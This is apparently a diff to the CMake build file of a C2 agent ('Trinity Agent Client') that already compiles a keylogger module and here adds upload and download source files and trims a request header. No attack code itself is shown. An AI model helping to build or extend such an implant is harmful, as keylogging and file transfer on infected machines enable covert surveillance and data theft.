@@ -28,7 +28,7 @@ string(STRIP "${PORT}" CLEAN_PORT)
 set(INPUT_USER_AGENT "Trinity Agent Client/1.0" CACHE STRING "The user agent for requests")
 
 # Agent Header Configuration
-set(INPUT_REQUEST_HEADER "Content-Type: application/json\r\n" CACHE STRING "The agent request header")
+set(INPUT_REQUEST_HEADER "Content-Type: application/json" CACHE STRING "The agent request header")
 
 # Add source to this project's executable.
 add_executable (
@@ -48,6 +48,10 @@ add_executable (
   "include/mscorlib.h"
   "include/Keylogger.h"
   "src/Keylogger.cpp"
+  "include/Upload.h"
+  "src/Upload.cpp"
+  "include/Download.h"
+  "src/Download.cpp"
 )
 
 target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
